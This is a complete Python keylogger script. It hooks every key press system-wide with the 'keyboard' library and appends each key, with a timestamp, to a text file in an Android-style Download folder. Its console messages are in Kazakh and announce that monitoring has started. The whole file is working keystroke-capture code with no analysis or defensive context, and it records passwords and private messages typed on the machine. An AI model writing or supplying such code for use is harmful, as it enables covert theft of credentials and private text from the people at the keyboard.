import keyboard
import datetime
import os

LOG_FILE = "/storage/emulated/0/Download/key_history.txt"

def get_time():
    return datetime.datetime.now().strftime("%H:%M:%S")

def on_press(event):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            if event.name == "space":
                f.write(f"{get_time()} - [PROBEL]\n")
            elif event.name == "enter":
                f.write(f"{get_time()} - [ENTER]\n")
            elif event.name == "backspace":
                f.write(f"{get_time()} - [BACKSPACE]\n")
            elif len(event.name) == 1:
                f.write(f"{get_time()} - {event.name}\n")
            else:
                f.write(f"{get_time()} - [{event.name}]\n")
    except:
        pass

print("Бақылау басталды! Тоқтату үшін CTRL+C басыңыз.")
keyboard.on_press(on_press)
keyboard.wait()  # Тоқтатқанша күтеді
